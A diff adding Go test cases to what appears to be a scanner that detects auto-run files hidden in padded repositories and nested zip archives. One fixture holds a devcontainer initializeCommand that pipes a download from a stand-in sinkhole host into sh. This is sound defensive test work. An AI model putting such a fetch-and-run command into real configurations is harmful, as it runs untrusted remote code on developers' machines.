@@ -63,6 +63,34 @@ func zipOfZips(n int) func(t *testing.T, dest string) {
 	}
 }
 
+// zipOfInnerZips returns a builder for a zip of three zips that hold 9000 members each, the
+// folder-open task of p1-folderopen-curl last. Together they have more members than the file cap.
+func zipOfInnerZips(t *testing.T) func(t *testing.T, dest string) {
+	return func(t *testing.T, dest string) {
+		var outer []zipEntry
+		for k := range 3 {
+			var inner []zipEntry
+			for i := range 9000 {
+				inner = append(inner, zipEntry{name: fmt.Sprintf("f%05d.txt", i), data: []byte("x")})
+			}
+			if k == 2 {
+				inner[len(inner)-1] = zipEntry{name: ".vscode/tasks.json", data: p1Tasks(t)}
+			}
+			outer = append(outer, zipEntry{name: fmt.Sprintf("in%d.zip", k), data: zipBytes(t, inner)})
+		}
+		zipEntries(t, dest, outer)
+	}
+}
+
+// smallJar is a benign jar of a few classes.
+func smallJar(t *testing.T) []byte {
+	var entries []zipEntry
+	for i := range 100 {
+		entries = append(entries, zipEntry{name: fmt.Sprintf("com/example/C%03d.class", i), data: []byte("class")})
+	}
+	return zipBytes(t, entries)
+}
+
 // TestLimits answers the padding attacks on P1: a repository padded past the file cap or the job
 // budget must not hide its auto-run files, and a benign large repository must stay clean.
 func TestLimits(t *testing.T) {
@@ -92,6 +120,35 @@ func TestLimits(t *testing.T) {
 			setup:     paddedRepo(20050, nil),
 			wantCode:  0,
 			wantLevel: "medium",
+		},
+		{
+			name: "folder-open task in the last member of three zips with 9000 members each is read",
+			setup: func(t *testing.T) string {
+				return builtFile("big.zip", zipOfInnerZips(t))(t)
+			},
+			wantCode: 20,
+			wantAt:   map[string]string{"GAL-AUTOEXEC-001": "big.zip!/in2.zip!/.vscode/tasks.json:7"},
+		},
+		{
+			name: "benign jar after 19950 files stays clean",
+			setup: func(t *testing.T) string {
+				return paddedRepo(19950, map[string][]byte{"z.jar": smallJar(t)})(t)
+			},
+			wantCode: 0,
+		},
+		{
+			name: "the same jar before 25000 files stays clean",
+			setup: func(t *testing.T) string {
+				return paddedRepo(25000, map[string][]byte{"0.jar": smallJar(t)})(t)
+			},
+			wantCode: 0,
+		},
+		{
+			name: "devcontainer in a zip member directory called x! is read",
+			setup: builtFile("repo.zip", func(t *testing.T, dest string) {
+				zipEntries(t, dest, []zipEntry{{name: "repo/.devcontainer/py!/devcontainer.json", data: []byte("{\"initializeCommand\": \"curl https://payload.sinkhole.test/x | sh\"}\n")}})
+			}),
+			wantCode: 20,
 		},
 		{
 			name:  "zip of many zips stays under the job budget and is not clean",
